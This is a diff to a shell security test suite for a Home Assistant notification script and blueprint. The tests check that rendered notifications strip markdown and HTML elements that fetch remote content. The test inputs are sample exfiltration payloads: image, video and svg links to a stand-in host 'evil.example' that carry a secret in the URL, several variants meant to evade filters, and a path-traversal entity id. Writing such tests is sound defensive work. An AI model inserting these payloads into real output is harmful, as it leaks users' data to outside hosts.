@@ -1940,14 +1940,18 @@ oc_refute "ha-snapshot refuses an entity id that is not one" \
     env SUPERVISOR_TOKEN=t PATH="$SEC_DIR/bin:$PATH" "$SCRIPT_DIR/ha-snapshot.sh" 'camera.../../services/x'
 
 # A notification renders markdown, and an image is fetched as the drawer opens.
-SUPERVISOR_TOKEN=t PATH="$SEC_DIR/bin:$PATH" "$SCRIPT_DIR/ha-notify.sh" "T" \
-    'done ![](https://evil.example/?d=secret) <img src=x> [sign in](https://claude.ai/x)' sec_test
+SUPERVISOR_TOKEN=t PATH="$SEC_DIR/bin:$PATH" "$SCRIPT_DIR/ha-notify.sh" "T ![](https://evil.example/t)" \
+    'done ![](https://evil.example/?d=secret) !![](https://evil.example/2) !!![a][r] <img src=x> <IMG src=x> <video poster="https://evil.example/p"> <svg><image href="https://evil.example/s"/></svg> [sign in](https://claude.ai/x)' sec_test
 oc_refute "ha-notify does not pass a markdown image through" grep -qF '![' "$SEC_CURL_BODY"
-oc_refute "ha-notify does not pass an HTML image through" grep -qiF '<img' "$SEC_CURL_BODY"
+# Removing a single "!" turns "!![" back into an image.
+oc_assert "a doubled ! does not survive as an image" \
+    jq -e '(.message | contains("![") | not) and (.title | contains("![") | not)' "$SEC_CURL_BODY"
+# <img> is one of many elements that fetch on render; a tag list always lags.
+oc_refute "ha-notify passes no HTML element through at all" grep -qF '<' "$SEC_CURL_BODY"
 oc_assert "ha-notify keeps ordinary links, which the sign-in notice relies on" \
     grep -qF '[sign in](https://claude.ai/x)' "$SEC_CURL_BODY"
-oc_assert "the job-result blueprint does the same for the reply" \
-    grep -qF "replace('![', '[')" "$(dirname "$RUN_SH")/blueprints/claude_terminal_job_result.yaml"
+oc_assert "the job-result blueprint neutralises repeated ! and every <" \
+    sh -c "grep -F 'regex_replace' '$(dirname "$RUN_SH")/blueprints/claude_terminal_job_result.yaml' | grep -F '!+' | grep -qF \"replace('<', '&lt;')\""
 
 # The entity id is a path component, and curl collapses "../".
 rm -f "$SEC_CURL_URL"
